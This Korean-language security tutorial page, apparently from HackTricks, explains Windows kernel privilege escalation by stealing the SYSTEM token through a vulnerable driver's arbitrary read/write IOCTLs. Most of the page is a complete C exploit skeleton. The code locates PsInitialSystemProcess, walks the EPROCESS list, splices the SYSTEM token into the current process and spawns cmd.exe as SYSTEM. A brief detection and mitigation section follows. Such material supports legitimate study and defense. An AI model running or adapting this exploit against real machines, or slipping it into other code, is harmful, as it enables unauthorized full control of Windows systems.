# Windows kernel EoP: arbitrary kernel R/W를 이용한 Token stealing

{{#include ../../banners/hacktricks-training.md}}

## 개요

취약한 driver가 공격자에게 arbitrary kernel read 및/또는 write primitive를 제공하는 IOCTL을 노출하는 경우, SYSTEM access token을 탈취하면 NT AUTHORITY\SYSTEM으로 권한 상승을 수행할 수 있습니다. 이 technique은 SYSTEM process의 EPROCESS에서 Token pointer를 복사하여 현재 process의 EPROCESS에 넣습니다.<sup>[[2]](#references)</sup>

작동하는 이유:
- 각 process에는 EPROCESS structure가 있으며, 여기에는 여러 field 중 Token이 포함됩니다(실제로는 token object에 대한 EX_FAST_REF입니다).
- SYSTEM process(PID 4)는 모든 privilege가 활성화된 token을 보유합니다.
- 현재 process의 EPROCESS.Token을 SYSTEM token pointer로 교체하면 현재 process가 즉시 SYSTEM으로 실행됩니다.<sup>[[1]](#references)</sup>

> EPROCESS의 offset은 Windows version마다 다릅니다. 동적으로(symbols 사용) 확인하거나 version별 constant를 사용해야 합니다. 또한 EPROCESS.Token이 EX_FAST_REF라는 점을 기억해야 합니다(하위 3 bit는 reference count flag입니다).

## High-level steps

1) ntoskrnl.exe base를 찾고 PsInitialSystemProcess의 address를 resolve합니다.
- user mode에서 NtQuerySystemInformation(SystemModuleInformation) 또는 EnumDeviceDrivers를 사용하여 loaded driver base를 가져옵니다.
- PsInitialSystemProcess의 offset(symbols/reversing으로 확인)을 kernel base에 더하여 해당 address를 가져옵니다.
2) PsInitialSystemProcess의 pointer를 read합니다 → 이는 SYSTEM의 EPROCESS를 가리키는 kernel pointer입니다.
3) SYSTEM EPROCESS에서 UniqueProcessId 및 ActiveProcessLinks offset을 read하여 EPROCESS structure의 doubly linked list(ActiveProcessLinks.Flink/Blink)를 순회하고, UniqueProcessId가 GetCurrentProcessId()와 같은 EPROCESS를 찾습니다. 다음 두 항목을 모두 유지합니다:
- EPROCESS_SYSTEM(SYSTEM용)
- EPROCESS_SELF(현재 process용)
4) SYSTEM token value를 read합니다: Token_SYS = *(EPROCESS_SYSTEM + TokenOffset).
- 하위 3 bit를 mask out합니다: Token_SYS_masked = Token_SYS & ~0xF (build에 따라 일반적으로 ~0xF 또는 ~0x7을 사용하며, x64에서는 하위 3 bit가 사용됩니다 — 0xFFFFFFFFFFFFFFF8 mask).
5) Option A(일반적인 방법): 현재 token의 하위 3 bit를 보존하고 이를 SYSTEM pointer에 결합하여 embedded ref count의 일관성을 유지합니다.
- Token_ME = *(EPROCESS_SELF + TokenOffset)
- Token_NEW = (Token_SYS_masked | (Token_ME & 0x7))
6) kernel write primitive를 사용하여 Token_NEW를 (EPROCESS_SELF + TokenOffset)에 다시 write합니다.
7) 현재 process가 이제 SYSTEM이 됩니다. 확인을 위해 선택적으로 새 cmd.exe 또는 powershell.exe를 spawn할 수 있습니다.<sup>[[1]](#references)</sup>

## Pseudocode

아래는 취약한 driver의 두 IOCTL만 사용하는 skeleton입니다. 하나는 8-byte kernel read용이고 다른 하나는 8-byte kernel write용입니다. 사용 중인 driver의 interface에 맞게 교체해야 합니다.<sup>[[1]](#references)</sup>
```c
#include <Windows.h>
#include <Psapi.h>
#include <stdint.h>

// Device + IOCTLs are driver-specific
#define DEV_PATH   "\\\\.\\VulnDrv"
#define IOCTL_KREAD  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_KWRITE CTL_CODE(FILE_DEVICE_UNKNOWN, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)

// Version-specific (examples only – resolve per build!)
static const uint32_t Off_EPROCESS_UniquePid    = 0x448; // varies
static const uint32_t Off_EPROCESS_Token        = 0x4b8; // varies
static const uint32_t Off_EPROCESS_ActiveLinks  = 0x448 + 0x8; // often UniquePid+8, varies

BOOL kread_qword(HANDLE h, uint64_t kaddr, uint64_t *out) {
struct { uint64_t addr; } in; struct { uint64_t val; } outb; DWORD ret;
in.addr = kaddr; return DeviceIoControl(h, IOCTL_KREAD, &in, sizeof(in), &outb, sizeof(outb), &ret, NULL) && (*out = outb.val, TRUE);
}
BOOL kwrite_qword(HANDLE h, uint64_t kaddr, uint64_t val) {
struct { uint64_t addr, val; } in; DWORD ret;
in.addr = kaddr; in.val = val; return DeviceIoControl(h, IOCTL_KWRITE, &in, sizeof(in), NULL, 0, &ret, NULL);
}

// Get ntoskrnl base (one option)
uint64_t get_nt_base(void) {
LPVOID drivers[1024]; DWORD cbNeeded;
if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded >= sizeof(LPVOID)) {
return (uint64_t)drivers[0]; // first is typically ntoskrnl
}
return 0;
}

int main(void) {
HANDLE h = CreateFileA(DEV_PATH, GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
if (h == INVALID_HANDLE_VALUE) return 1;

// 1) Resolve PsInitialSystemProcess
uint64_t nt = get_nt_base();
uint64_t PsInitialSystemProcess = nt + /*offset of symbol*/ 0xDEADBEEF; // resolve per build

// 2) Read SYSTEM EPROCESS
uint64_t EPROC_SYS; kread_qword(h, PsInitialSystemProcess, &EPROC_SYS);

// 3) Walk ActiveProcessLinks to find current EPROCESS
DWORD myPid = GetCurrentProcessId();
uint64_t cur = EPROC_SYS; // list is circular
uint64_t EPROC_ME = 0;
do {
uint64_t pid; kread_qword(h, cur + Off_EPROCESS_UniquePid, &pid);
if ((DWORD)pid == myPid) { EPROC_ME = cur; break; }
uint64_t flink; kread_qword(h, cur + Off_EPROCESS_ActiveLinks, &flink);
cur = flink - Off_EPROCESS_ActiveLinks; // CONTAINING_RECORD
} while (cur != EPROC_SYS);

// 4) Read tokens
uint64_t tok_sys, tok_me;
kread_qword(h, EPROC_SYS + Off_EPROCESS_Token, &tok_sys);
kread_qword(h, EPROC_ME  + Off_EPROCESS_Token, &tok_me);

// 5) Mask EX_FAST_REF low bits and splice refcount bits
uint64_t tok_sys_mask = tok_sys & ~0xF; // or ~0x7 on some builds
uint64_t tok_new = tok_sys_mask | (tok_me & 0x7);

// 6) Write back
kwrite_qword(h, EPROC_ME + Off_EPROCESS_Token, tok_new);

// 7) We are SYSTEM now
system("cmd.exe");
return 0;
}
```
Notes:
- Offsets: 대상의 PDB를 사용해 WinDbg의 `dt nt!_EPROCESS`를 실행하거나 runtime symbol loader를 사용하여 올바른 오프셋을 가져오세요. 무작정 하드코딩하지 마세요.
- Mask: x64에서 token은 EX_FAST_REF입니다. 하위 3비트는 reference count 비트입니다. token의 원래 하위 비트를 유지하면 즉각적인 refcount 불일치를 방지할 수 있습니다.
- Stability: 현재 프로세스를 elevating하는 방식을 선호하세요. 짧은 수명의 helper를 elevate하면 해당 프로세스가 종료될 때 SYSTEM 권한을 잃을 수 있습니다.<sup>[[1]](#references)</sup>

## Detection & mitigation
- 강력한 IOCTL을 노출하는 서명되지 않았거나 신뢰할 수 없는 third-party drivers를 로드하는 것이 root cause입니다.
- Kernel Driver Blocklist (HVCI/CI), DeviceGuard, Attack Surface Reduction rules는 취약한 drivers가 로드되는 것을 방지할 수 있습니다.
- EDR은 arbitrary read/write를 구현하는 의심스러운 IOCTL sequences와 token swaps를 감시할 수 있습니다.

## References

- [1] [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [2] [FuzzySecurity – Windows Kernel ExploitDev (token stealing examples)](https://www.fuzzysecurity.com/tutorials/expDev/17.html)

{{#include ../../banners/hacktricks-training.md}}
